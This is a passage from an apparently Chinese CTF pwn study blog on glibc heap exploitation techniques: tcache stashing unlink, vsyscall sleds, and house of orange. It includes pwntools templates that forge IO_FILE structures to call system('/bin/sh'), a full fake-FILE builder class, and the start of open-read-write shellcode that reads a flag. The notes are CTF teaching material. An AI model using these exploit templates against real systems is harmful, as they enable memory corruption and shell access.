src="https://s3.ax1x.com/2021/01/02/rzztGF.png" alt="rzztGF.png"></a></p><p>如果不是多线程的话，则需要能够通过mmap分配到tls结构体附近，因为tls结构体是通过mmap分配的。malloc函数在分配大内存时就会使用mmap进行分配，如果能够用mmap分配过去并且能够溢出到tls结构体就可以修改canary。</p><h2 id="0x4-vsyscall作为滑板指令"><a href="#0x4-vsyscall作为滑板指令" class="headerlink" title="0x4.vsyscall作为滑板指令"></a>0x4.vsyscall作为滑板指令</h2><p>vsyscall可以作为滑板指令，也就是相当于一个ret，使rop链向下滑动。当程序开启了pie后且没有libc地址，无法使用gadget时就可以使用这条指令作为ret来使程序流向下滑动，然后再进行partial overwrite覆盖返回地址为onegadget或别的。</p><p><a href="https://imgchr.com/i/sSpNu9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/02/sSpNu9.png" alt="sSpNu9.png"></a></p><p>通常使用<code>0xffffffffff600000</code>这个地址。</p><h2 id="0x5-glibc2-29及更高版本的uaf"><a href="#0x5-glibc2-29及更高版本的uaf" class="headerlink" title="0x5.glibc2.29及更高版本的uaf"></a>0x5.glibc2.29及更高版本的uaf</h2><p>高版本下glibc引入了stash机制，就是当从fastbin中取完hunk后，会将这条链上剩下的bin放到对应大小的tcache中。</p><p>在glibc2.29以及更高版本的glibc中，如果存在uaf但无法修改tcache的key值，先将tcache填满，然后在fastbin中进行double free，借着再从tcache中取chunk，使tcache为空或者不满，然后再从fastbin里取chunk，fastbin中剩余的chunk会被放入tcache中，而tcache不检查size，可以任意分配，这样能方便利用。</p><h2 id="0x6-tcache-stashing-unlink"><a href="#0x6-tcache-stashing-unlink" class="headerlink" title="0x6.tcache_stashing_unlink"></a>0x6.tcache_stashing_unlink</h2><p>这个技巧能够将任意地址写一个固定的值，也就是smallbin的表头</p><p>只记录下构造方法，实现原理不再赘述</p><p>前提需要能绕过tcache取chunk，也就是需要<code>calloc</code>函数</p><p>1.<code>tcache</code>中放<code>6</code>个，<code>smallbin</code>中放两个</p><p>2.将后进<code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为目标地址<code>-0x10</code></p><p>3.从smallbin中取一个chunk，先进入smallbin的chunk被分配给用户，后进入的chunk由于stash机制被放入tcache</p><p>由于<code>bck = tc_victim-&gt;bk</code>，bck即为目标地址-0x10，<code>bck-&gt;fd = bin</code>，最终目标地址被写入了smallbin表头的地址。</p><h2 id="0x7-tcache-stashing-unlink-plus"><a href="#0x7-tcache-stashing-unlink-plus" class="headerlink" title="0x7.tcache_stashing_unlink plus"></a>0x7.tcache_stashing_unlink plus</h2><p>这个技巧能够往任意地址处分配一个chunk</p><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p><p>2.将后进<code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为目标地址<code>-0x10</code>，同时将目标地址<code>+0x8</code>处的值设置为一个指向可写内存的指针。</p><p>3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p><h2 id="0x8-tcache-stashing-unlink-plus-plus"><a href="#0x8-tcache-stashing-unlink-plus-plus" class="headerlink" title="0x8.tcache_stashing_unlink plus plus"></a>0x8.tcache_stashing_unlink plus plus</h2><p>这个技巧能够同时实现任意地址分配chunk和任意地址写两个目标。</p><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p><p>2.将后进<code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为目标地址1<code>-0x10</code>，将目标地址 1 <code>+ 0x8</code> 的位置设置为目标地址 2 <code>-0x10</code>.</p><p>3.从smallbin中取一个chunk，即可实现两个目标。</p><h2 id="0x9-一个控制程序流的gadget"><a href="#0x9-一个控制程序流的gadget" class="headerlink" title="0x9.一个控制程序流的gadget"></a>0x9.一个控制程序流的gadget</h2><p>在libc2.31中有这样一个gadget</p><pre class=" language-assembly"><code class="language-assembly">0x0000000000157fea: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28];</code></pre><p>如果我们可以控制rdi，那么就能够进行一个任意call。</p><p>一般用于堆题的orw</p><p>同样的，在其他版本的libc中也存在着类似的gadget，只不过细节不一样，但都能达成call的作用</p><h2 id="0xA-格式化字符串写入注意"><a href="#0xA-格式化字符串写入注意" class="headerlink" title="0xA.格式化字符串写入注意"></a>0xA.格式化字符串写入注意</h2><p>如果要一次性修改malloc_hook或者free_hook并且发送大量字符触发onegadget的话，一定要注意，%99999c不能放在payload的最后，因为如果把%99999c放在地址后面，地址存在空字符，那样往printf的缓冲区内写数据时就会截断！%99999c就无法写入，自然也无法触发malloc_hook!</p><h2 id="0xB-house-of-orange"><a href="#0xB-house-of-orange" class="headerlink" title="0xB.house of orange"></a>0xB.house of orange</h2><p>1.需要libc地址和heap地址，还需要能够溢出。一种情况是修改unsorted bin的大小为0x61，修改其bk指针为<code>&amp;io_list_all-0x10</code>，设置好<code>fp-&gt;flag='/bin/sh\x00'</code>,<code>fp-&gt;_mode &lt;= 0</code> 且<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，注意偏移，vtable指针设置为某个我们能控制的内存，再将这片伪造的vtable空间的0x18偏移处设置为system函数的地址，如下图所示</p><p><a href="https://imgchr.com/i/s9Gbp6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/03/s9Gbp6.png" alt="s9Gbp6.png"></a></p><p>构造模板为</p><pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建一个IO_FILE对象</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置_flag为binsh，_flag的位置为unsorted bin的presize</span>fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span><span class="token comment" spellcheck="true">#修改unsorted bin的size为0x61</span>fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#修改unsorted bin的bk指针为_IO_list_all-0x10</span>fake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#满足_IO_write_ptr > _IO_write_ptr</span>fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span><span class="token comment" spellcheck="true">#满足_mode&lt;=0</span>fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x4f0</span><span class="token operator">+</span>fake_file<span class="token punctuation">.</span>size<span class="token comment" spellcheck="true">#设置vtable指向fake_file下方</span>pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>  <span class="token comment" spellcheck="true"># vtable，_IO_OVERFLOW在_IO_jump_t中的偏移为0x18</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 设置_IO_OVERFLOW为system，</span></code></pre><p>上面的方法只适用于libc2.23及更低版本libc，libc2.24对vtable的位置进行了检查，所以不能随意伪造vtable了。</p><p>我们使用<code>_IO_str_jumps</code>这个vtable来伪造我们的vtable</p><p>结构如下</p><pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> p _IO_str_jumps $<span class="token number">19</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  __dummy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>   __dummy2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>   __finish <span class="token operator">=</span> <span class="token number">0x7ffff7a906b0</span> <span class="token operator">&lt;</span>_IO_str_finish<span class="token operator">></span><span class="token punctuation">,</span>   __overflow <span class="token operator">=</span> <span class="token number">0x7ffff7a90310</span> <span class="token operator">&lt;</span>__GI__IO_str_overflow<span class="token operator">></span><span class="token punctuation">,</span>   __underflow <span class="token operator">=</span> <span class="token number">0x7ffff7a902b0</span> <span class="token operator">&lt;</span>__GI__IO_str_underflow<span class="token operator">></span><span class="token punctuation">,</span>   __uflow <span class="token operator">=</span> <span class="token number">0x7ffff7a8e900</span> <span class="token operator">&lt;</span>__GI__IO_default_uflow<span class="token operator">></span><span class="token punctuation">,</span>   __pbackfail <span class="token operator">=</span> <span class="token number">0x7ffff7a90690</span> <span class="token operator">&lt;</span>__GI__IO_str_pbackfail<span class="token operator">></span><span class="token punctuation">,</span>   __xsputn <span class="token operator">=</span> <span class="token number">0x7ffff7a8e960</span> <span class="token operator">&lt;</span>__GI__IO_default_xsputn<span class="token operator">></span><span class="token punctuation">,</span>   __xsgetn <span class="token operator">=</span> <span class="token number">0x7ffff7a8eaf0</span> <span class="token operator">&lt;</span>__GI__IO_default_xsgetn<span class="token operator">></span><span class="token punctuation">,</span>   __seekoff <span class="token operator">=</span> <span class="token number">0x7ffff7a907e0</span> <span class="token operator">&lt;</span>__GI__IO_str_seekoff<span class="token operator">></span><span class="token punctuation">,</span>   __seekpos <span class="token operator">=</span> <span class="token number">0x7ffff7a8eea0</span> <span class="token operator">&lt;</span>_IO_default_seekpos<span class="token operator">></span><span class="token punctuation">,</span>   __setbuf <span class="token operator">=</span> <span class="token number">0x7ffff7a8ed70</span> <span class="token operator">&lt;</span>_IO_default_setbuf<span class="token operator">></span><span class="token punctuation">,</span>   __sync <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span>   __doallocate <span class="token operator">=</span> <span class="token number">0x7ffff7a8ef10</span> <span class="token operator">&lt;</span>__GI__IO_default_doallocate<span class="token operator">></span><span class="token punctuation">,</span>   __read <span class="token operator">=</span> <span class="token number">0x7ffff7a90160</span> <span class="token operator">&lt;</span>_IO_default_read<span class="token operator">></span><span class="token punctuation">,</span>   __write <span class="token operator">=</span> <span class="token number">0x7ffff7a90170</span> <span class="token operator">&lt;</span>_IO_default_write<span class="token operator">></span><span class="token punctuation">,</span>   __seek <span class="token operator">=</span> <span class="token number">0x7ffff7a90140</span> <span class="token operator">&lt;</span>_IO_default_seek<span class="token operator">></span><span class="token punctuation">,</span>   __close <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span>   __stat <span class="token operator">=</span> <span class="token number">0x7ffff7a90150</span> <span class="token operator">&lt;</span>_IO_default_stat<span class="token operator">></span><span class="token punctuation">,</span>   __showmanyc <span class="token operator">=</span> <span class="token number">0x7ffff7a90180</span> <span class="token operator">&lt;</span>_IO_default_showmanyc<span class="token operator">></span><span class="token punctuation">,</span>   __imbue <span class="token operator">=</span> <span class="token number">0x7ffff7a90190</span> <span class="token operator">&lt;</span>_IO_default_imbue<span class="token operator">></span><span class="token punctuation">}</span></code></pre><p>伪造的FILE结构体需要满足如下条件</p><pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_flags<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">==</span><span class="token number">0</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_basefp<span class="token operator">-></span>_IO_buf_base<span class="token operator">=</span>binshfp<span class="token operator">-></span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>fp<span class="token operator">+</span><span class="token number">0xe8</span><span class="token operator">=</span>system</code></pre><p>构造模板为</p><pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>fake_file<span class="token punctuation">.</span>_IO_buf_base<span class="token operator">=</span>binsh_addrfake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span>fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre><p>附上IO_FILE结构体的偏移量</p><pre class=" language-c"><code class="language-c"><span class="token number">0x0</span>   _flags<span class="token number">0x8</span>   _IO_read_ptr<span class="token number">0x10</span>  _IO_read_end<span class="token number">0x18</span>  _IO_read_base<span class="token number">0x20</span>  _IO_write_base<span class="token number">0x28</span>  _IO_write_ptr<span class="token number">0x30</span>  _IO_write_end<span class="token number">0x38</span>  _IO_buf_base<span class="token number">0x40</span>  _IO_buf_end<span class="token number">0x48</span>  _IO_save_base<span class="token number">0x50</span>  _IO_backup_base<span class="token number">0x58</span>  _IO_save_end<span class="token number">0x60</span>  _markers<span class="token number">0x68</span>  _chain<span class="token number">0x70</span>  _fileno<span class="token number">0x74</span>  _flags2<span class="token number">0x78</span>  _old_offset<span class="token number">0x80</span>  _cur_column<span class="token number">0x82</span>  _vtable_offset<span class="token number">0x83</span>  _shortbuf<span class="token number">0x88</span>  _lock<span class="token number">0x90</span>  _offset<span class="token number">0x98</span>  _codecvt<span class="token number">0xa0</span>  _wide_data<span class="token number">0xa8</span>  _freeres_list<span class="token number">0xb0</span>  _freeres_buf<span class="token number">0xb8</span>  __pad5<span class="token number">0xc0</span>  _mode<span class="token number">0xc4</span>  _unused2<span class="token number">0xd8</span>  vtable</code></pre><p>以及<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">veritas501</a>师傅写的IO_FILE结构体伪造模块</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>_IO_FILE_plus_size <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'i386'</span><span class="token punctuation">:</span><span class="token number">0x98</span><span class="token punctuation">,</span>    <span class="token string">'amd64'</span><span class="token punctuation">:</span><span class="token number">0xe0</span><span class="token punctuation">}</span>_IO_FILE_plus <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'i386'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token number">0x0</span><span class="token punctuation">:</span><span class="token string">'_flags'</span><span class="token punctuation">,</span>        <span class="token number">0x4</span><span class="token punctuation">:</span><span class="token string">'_IO_read_ptr'</span><span class="token punctuation">,</span>        <span class="token number">0x8</span><span class="token punctuation">:</span><span class="token string">'_IO_read_end'</span><span class="token punctuation">,</span>        <span class="token number">0xc</span><span class="token punctuation">:</span><span class="token string">'_IO_read_base'</span><span class="token punctuation">,</span>        <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">'_IO_write_base'</span><span class="token punctuation">,</span>        <span class="token number">0x14</span><span class="token punctuation">:</span><span class="token string">'_IO_write_ptr'</span><span class="token punctuation">,</span>        <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">'_IO_write_end'</span><span class="token punctuation">,</span>        <span class="token number">0x1c</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_base'</span><span class="token punctuation">,</span>        <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_end'</span><span class="token punctuation">,</span>        <span class="token number">0x24</span><span class="token punctuation">:</span><span class="token string">'_IO_save_base'</span><span class="token punctuation">,</span>        <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">'_IO_backup_base'</span><span class="token punctuation">,</span>        <span class="token number">0x2c</span><span class="token punctuation">:</span><span class="token string">'_IO_save_end'</span><span class="token punctuation">,</span>        <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">'_markers'</span><span class="token punctuation">,</span>        <span class="token number">0x34</span><span class="token punctuation">:</span><span class="token string">'_chain'</span><span class="token punctuation">,</span>        <span class="token number">0x38</span><span class="token punctuation">:</span><span class="token string">'_fileno'</span><span class="token punctuation">,</span>        <span class="token number">0x3c</span><span class="token punctuation">:</span><span class="token string">'_flags2'</span><span class="token punctuation">,</span>        <span class="token number">0x40</span><span class="token punctuation">:</span><span class="token string">'_old_offset'</span><span class="token punctuation">,</span>        <span class="token number">0x44</span><span class="token punctuation">:</span><span class="token string">'_cur_column'</span><span class="token punctuation">,</span>        <span class="token number">0x46</span><span class="token punctuation">:</span><span class="token string">'_vtable_offset'</span><span class="token punctuation">,</span>        <span class="token number">0x47</span><span class="token punctuation">:</span><span class="token string">'_shortbuf'</span><span class="token punctuation">,</span>        <span class="token number">0x48</span><span class="token punctuation">:</span><span class="token string">'_lock'</span><span class="token punctuation">,</span>        <span class="token number">0x4c</span><span class="token punctuation">:</span><span class="token string">'_offset'</span><span class="token punctuation">,</span>        <span class="token number">0x54</span><span class="token punctuation">:</span><span class="token string">'_codecvt'</span><span class="token punctuation">,</span>        <span class="token number">0x58</span><span class="token punctuation">:</span><span class="token string">'_wide_data'</span><span class="token punctuation">,</span>        <span class="token number">0x5c</span><span class="token punctuation">:</span><span class="token string">'_freeres_list'</span><span class="token punctuation">,</span>        <span class="token number">0x60</span><span class="token punctuation">:</span><span class="token string">'_freeres_buf'</span><span class="token punctuation">,</span>        <span class="token number">0x64</span><span class="token punctuation">:</span><span class="token string">'__pad5'</span><span class="token punctuation">,</span>        <span class="token number">0x68</span><span class="token punctuation">:</span><span class="token string">'_mode'</span><span class="token punctuation">,</span>        <span class="token number">0x6c</span><span class="token punctuation">:</span><span class="token string">'_unused2'</span><span class="token punctuation">,</span>        <span class="token number">0x94</span><span class="token punctuation">:</span><span class="token string">'vtable'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">'amd64'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token number">0x0</span><span class="token punctuation">:</span><span class="token string">'_flags'</span><span class="token punctuation">,</span>        <span class="token number">0x8</span><span class="token punctuation">:</span><span class="token string">'_IO_read_ptr'</span><span class="token punctuation">,</span>        <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">'_IO_read_end'</span><span class="token punctuation">,</span>        <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">'_IO_read_base'</span><span class="token punctuation">,</span>        <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">'_IO_write_base'</span><span class="token punctuation">,</span>        <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">'_IO_write_ptr'</span><span class="token punctuation">,</span>        <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">'_IO_write_end'</span><span class="token punctuation">,</span>        <span class="token number">0x38</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_base'</span><span class="token punctuation">,</span>        <span class="token number">0x40</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_end'</span><span class="token punctuation">,</span>        <span class="token number">0x48</span><span class="token punctuation">:</span><span class="token string">'_IO_save_base'</span><span class="token punctuation">,</span>        <span class="token number">0x50</span><span class="token punctuation">:</span><span class="token string">'_IO_backup_base'</span><span class="token punctuation">,</span>        <span class="token number">0x58</span><span class="token punctuation">:</span><span class="token string">'_IO_save_end'</span><span class="token punctuation">,</span>        <span class="token number">0x60</span><span class="token punctuation">:</span><span class="token string">'_markers'</span><span class="token punctuation">,</span>        <span class="token number">0x68</span><span class="token punctuation">:</span><span class="token string">'_chain'</span><span class="token punctuation">,</span>        <span class="token number">0x70</span><span class="token punctuation">:</span><span class="token string">'_fileno'</span><span class="token punctuation">,</span>        <span class="token number">0x74</span><span class="token punctuation">:</span><span class="token string">'_flags2'</span><span class="token punctuation">,</span>        <span class="token number">0x78</span><span class="token punctuation">:</span><span class="token string">'_old_offset'</span><span class="token punctuation">,</span>        <span class="token number">0x80</span><span class="token punctuation">:</span><span class="token string">'_cur_column'</span><span class="token punctuation">,</span>        <span class="token number">0x82</span><span class="token punctuation">:</span><span class="token string">'_vtable_offset'</span><span class="token punctuation">,</span>        <span class="token number">0x83</span><span class="token punctuation">:</span><span class="token string">'_shortbuf'</span><span class="token punctuation">,</span>        <span class="token number">0x88</span><span class="token punctuation">:</span><span class="token string">'_lock'</span><span class="token punctuation">,</span>        <span class="token number">0x90</span><span class="token punctuation">:</span><span class="token string">'_offset'</span><span class="token punctuation">,</span>        <span class="token number">0x98</span><span class="token punctuation">:</span><span class="token string">'_codecvt'</span><span class="token punctuation">,</span>        <span class="token number">0xa0</span><span class="token punctuation">:</span><span class="token string">'_wide_data'</span><span class="token punctuation">,</span>        <span class="token number">0xa8</span><span class="token punctuation">:</span><span class="token string">'_freeres_list'</span><span class="token punctuation">,</span>        <span class="token number">0xb0</span><span class="token punctuation">:</span><span class="token string">'_freeres_buf'</span><span class="token punctuation">,</span>        <span class="token number">0xb8</span><span class="token punctuation">:</span><span class="token string">'__pad5'</span><span class="token punctuation">,</span>        <span class="token number">0xc0</span><span class="token punctuation">:</span><span class="token string">'_mode'</span><span class="token punctuation">,</span>        <span class="token number">0xc4</span><span class="token punctuation">:</span><span class="token string">'_unused2'</span><span class="token punctuation">,</span>        <span class="token number">0xd8</span><span class="token punctuation">:</span><span class="token string">'vtable'</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">IO_FILE_plus_struct</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">:</span>    arch <span class="token operator">=</span> None    endian <span class="token operator">=</span> None    fake_file <span class="token operator">=</span> None    size  <span class="token operator">=</span> <span class="token number">0</span>    FILE_struct <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    @LocalContext    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>arch <span class="token operator">=</span> context<span class="token punctuation">.</span>arch        self<span class="token punctuation">.</span>endian <span class="token operator">=</span> context<span class="token punctuation">.</span>endian        <span class="token keyword">if</span> self<span class="token punctuation">.</span>arch <span class="token operator">!=</span> <span class="token string">'i386'</span> <span class="token operator">and</span> self<span class="token punctuation">.</span>arch <span class="token operator">!=</span> <span class="token string">'amd64'</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'architecture not supported!'</span><span class="token punctuation">)</span>        success<span class="token punctuation">(</span><span class="token string">'arch: '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>FILE_struct <span class="token operator">=</span> <span class="token punctuation">[</span>_IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i  <span class="token keyword">in</span> sorted<span class="token punctuation">(</span>_IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">print</span> self<span class="token punctuation">.</span>FILE_struct        self<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>r<span class="token punctuation">:</span><span class="token number">0</span> <span class="token keyword">for</span> r <span class="token keyword">in</span> self<span class="token punctuation">.</span>FILE_struct<span class="token punctuation">}</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>size <span class="token operator">=</span> _IO_FILE_plus_size<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token operator">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>FILE_struct<span class="token punctuation">:</span>            log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"Unknown item %r (not in %r)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>item<span class="token punctuation">,</span> self<span class="token punctuation">.</span>FILE_struct<span class="token punctuation">)</span><span class="token punctuation">)</span>        super<span class="token punctuation">(</span>IO_FILE_plus_struct<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__setitem__<span class="token punctuation">(</span>item<span class="token punctuation">,</span> value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__setattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> attr <span class="token keyword">in</span> IO_FILE_plus_struct<span class="token punctuation">.</span>__dict__<span class="token punctuation">:</span>            super<span class="token punctuation">(</span>IO_FILE_plus_struct<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>attr<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token operator">=</span>value    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">[</span>attr<span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        fake_file <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">with</span> context<span class="token punctuation">.</span>local<span class="token punctuation">(</span>arch<span class="token operator">=</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> item_offset <span class="token keyword">in</span> sorted<span class="token punctuation">(</span>self<span class="token punctuation">.</span>item_offset<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span> <span class="token operator">&lt;</span> item_offset<span class="token punctuation">:</span>                    fake_file <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span>item_offset <span class="token operator">-</span> len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">)</span>                fake_file <span class="token operator">+=</span> pack<span class="token punctuation">(</span>self<span class="token punctuation">[</span>_IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">[</span>item_offset<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>word_size<span class="token operator">=</span><span class="token string">'all'</span><span class="token punctuation">)</span>            fake_file <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>size <span class="token operator">-</span> len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> fake_file    @property    <span class="token keyword">def</span> <span class="token function">item_offset</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xC-shellcode编写能力"><a href="#0xC-shellcode编写能力" class="headerlink" title="0xC.shellcode编写能力"></a>0xC.shellcode编写能力</h2><p>最常见的也就是orw的编写，题目开启了沙箱，禁止execve系统调用，因此需要通过open-read-write这三步来读出flag</p><pre class=" language-python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'/home/orw/flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token string">'esp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'esp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token 